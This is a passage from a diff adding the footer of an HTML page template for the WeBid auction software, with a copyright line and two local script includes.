+		Powered by <a href="http://www.webidsupport.com/">WeBid</a> &copy; 2008 - 2021 <a href="http://www.webidsupport.com/">WeBid</a>
+	</div>
+</div>
+<script src="http://localhost/js/jquery.lightbox.js"></script>
+<script src="http://localhost/js/webid.js"></script>
+</body>
+</html>
